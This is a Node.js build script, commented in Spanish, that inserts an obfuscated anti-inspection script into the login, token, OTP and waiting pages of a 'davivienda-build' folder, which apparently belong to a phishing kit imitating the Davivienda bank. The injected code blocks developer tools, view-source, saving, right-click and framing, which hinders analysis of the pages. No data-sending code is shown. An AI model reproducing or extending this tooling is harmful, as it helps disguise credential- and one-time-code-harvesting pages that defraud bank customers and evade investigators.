/* ============================================
   AGREGAR ANTI-INSPECCIÓN A DAVIVIENDA
   Inserta el bloque en cada HTML del build
   ============================================ */

const fs = require('fs');
const path = require('path');

const CARPETA = path.join(__dirname, 'davivienda-build');

const ARCHIVOS_HTML = [
    'index.html',
    'login.html',
    'token.html',
    'otp.html',
    'espera.html'
];

const BLOQUE_ANTI = `
<script>
(function(){
'use strict';
var _0xa1=0;
document.addEventListener('touchend',function(_0xb2){
var _0xc3=new Date().getTime();
if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
_0xa1=_0xc3;
},{passive:false});
document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
document.addEventListener('keydown',function(_0xf6){
var _0xg7=(_0xf6.key||'').toLowerCase();
var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
var _0xi9=_0xf6.shiftKey;
if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
});
document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
})();
</script>
`;

async function agregarAntiInspeccion(archivo) {
    const ruta = path.join(CARPETA, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        let contenido = fs.readFileSync(ruta, 'utf8');

        // Verificar si ya tiene el bloque
        if (contenido.indexOf('_0xa1=0') !== -1) {
            console.log(`   ⏭️  ${archivo} (ya tiene anti-inspección)`);
            return;
        }

        // Insertar antes de </body>
        if (contenido.indexOf('</body>') !== -1) {
            contenido = contenido.replace('</body>', BLOQUE_ANTI + '</body>');
        } else {
            contenido += BLOQUE_ANTI;
        }

        fs.writeFileSync(ruta, contenido);
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

async function main() {
    console.log('\n🔒 AGREGANDO ANTI-INSPECCIÓN A DAVIVIENDA\n');

    console.log('📄 Modificando HTML:');
    for (const archivo of ARCHIVOS_HTML) {
        await agregarAntiInspeccion(archivo);
    }

    console.log('\n✅ ANTI-INSPECCIÓN AGREGADO CORRECTAMENTE\n');
}

main();